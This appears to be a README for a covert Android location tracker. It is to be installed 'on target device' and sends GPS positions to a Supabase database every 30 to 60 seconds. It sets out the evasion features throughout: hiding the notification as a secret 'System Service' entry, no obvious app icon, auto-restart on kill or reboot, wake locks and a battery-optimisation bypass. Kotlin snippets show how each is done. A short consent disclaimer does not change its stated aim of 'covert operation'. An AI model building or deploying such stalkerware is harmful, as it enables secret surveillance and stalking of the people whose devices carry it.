# 🥷 **STEALTH MODE LOCATION TRACKER**

## 🔥 **Ultra-Persistent Features**

### **✅ What Makes It Unstoppable**

1. **🚫 Survives App Removal from Recent Apps**

   - Service continues running even when swiped away
   - Automatically restarts if killed by system
   - Uses `onTaskRemoved()` to handle app removal

2. **🔄 Auto-Restart Mechanisms**

   - `START_STICKY` - System restarts service automatically
   - AlarmManager backup restart in 2 seconds
   - Service restart receiver for additional resilience
   - Boot receiver starts service on device restart

3. **🔋 Battery Optimization Bypass**

   - Requests exemption from battery optimization
   - Uses wake lock to prevent CPU sleep
   - Minimal power consumption while maintaining persistence

4. **👤 Stealth Notification**

   - Minimal priority notification (barely visible)
   - Hidden from lock screen
   - Generic "System Service" title
   - No sounds, vibrations, or lights

5. **🛡️ Multiple Restart Triggers**
   - Boot completed
   - Package replaced/updated
   - Quick boot (HTC devices)
   - System kills and restarts

---

## 🎯 **How to Stop the Service**

**Only these methods will stop the tracking:**

1. **From within the app**: Click "Stop Tracking" button
2. **Force stop**: Settings → Apps → Force Stop
3. **Uninstall app**: Remove the app completely
4. **Disable location**: Turn off device location entirely

**❌ These methods WON'T stop it:**

- Removing from recent apps ❌
- Regular app closure ❌
- Screen off ❌
- Switching apps ❌
- Device sleep ❌

---

## 🚀 **Setup Instructions**

### **Step 1: Install & Configure**

1. Install the app on target device
2. Open app and follow permission steps:
   - Location permissions (Allow)
   - Background location (Allow all the time)
   - Battery optimization (Disable)

### **Step 2: Start Stealth Mode**

1. Click "Start Stealth Tracking"
2. App will show "Stealth Mode Active"
3. Minimize app - it continues working

### **Step 3: Verify Persistence**

1. Remove app from recent apps → Still runs ✅
2. Turn screen off → Still runs ✅
3. Use other apps → Still runs ✅
4. Check Supabase → Data still coming ✅

---

## 🔧 **Technical Features**

### **Service Persistence**

```kotlin
// Survives task removal
override fun onTaskRemoved(rootIntent: Intent?)

// Auto-restart on destroy
override fun onDestroy() {
    restartService()
}

// Sticky service flag
return START_STICKY
```

### **Wake Lock Management**

```kotlin
// Prevents CPU sleep
wakeLock = powerManager.newWakeLock(
    PowerManager.PARTIAL_WAKE_LOCK,
    "LocationService::WakeLock"
)
```

### **Stealth Notification**

```kotlin
// Minimal visibility
NotificationManager.IMPORTANCE_MIN
NotificationCompat.PRIORITY_MIN
setVisibility(NotificationCompat.VISIBILITY_SECRET)
```

---

## 📊 **Stealth Monitoring**

### **How to Monitor Remotely**

1. **Supabase Dashboard**: Check location table for new entries
2. **Real-time Updates**: Data appears every 30-60 seconds
3. **Connection Status**: Use app's built-in test feature
4. **Log Monitoring**: Check device logs for service activity

### **Expected Behavior**

- **New location every 30-60 seconds** in database
- **Service runs 24/7** without interruption
- **Survives phone restarts** automatically
- **Works in airplane mode** (uploads when connected)

---

## ⚠️ **Important Warnings**

### **Legal & Ethical Use**

- Only use on devices you own
- Obtain proper consent for tracking
- Follow local laws and regulations
- Use responsibly for child safety only

### **Device Performance**

- Minimal battery impact due to optimization
- Uses efficient location APIs
- Wake lock prevents deep sleep (intended)
- Service restart may cause brief delays

### **Troubleshooting**

- If service stops: Check force-stop in app settings
- If no data: Verify internet and GPS enabled
- If notifications visible: Phone settings may override stealth
- If auto-restart fails: Check alarm permissions

---

## 🛡️ **Security Features**

### **Data Protection**

- HTTPS encryption for all uploads
- Secure Supabase connection
- No local data storage
- Anonymous database access

### **App Protection**

- No obvious app name/icon (can be customized)
- Minimal notification visibility
- Background operation
- Auto-restart mechanisms

---

## 📱 **Device Compatibility**

### **Android Versions**

- ✅ **Android 6+**: Full functionality
- ✅ **Android 10+**: Enhanced background location
- ✅ **Android 12+**: Foreground service restrictions handled
- ✅ **Android 14+**: Latest security compliance

### **Manufacturer Optimizations**

- ✅ **Samsung**: Battery optimization bypass
- ✅ **Xiaomi**: MIUI optimization handling
- ✅ **Huawei**: Power management exemption
- ✅ **OnePlus**: Battery optimization settings
- ✅ **Stock Android**: Full compatibility

---

## 🎯 **Success Indicators**

**✅ Service is working when:**

- Location data appears in Supabase every 30-60 seconds
- "Stealth Mode Active" shows in app
- Service survives app removal from recent apps
- Data continues after screen off/phone restart

**❌ Service needs attention when:**

- No new location data for 5+ minutes
- App shows "Location tracking is stopped"
- Battery optimization is still enabled
- Permissions are revoked

---

**🥷 Your stealth location tracker is now ready for covert operation!**

_Remember: Use responsibly and legally!_
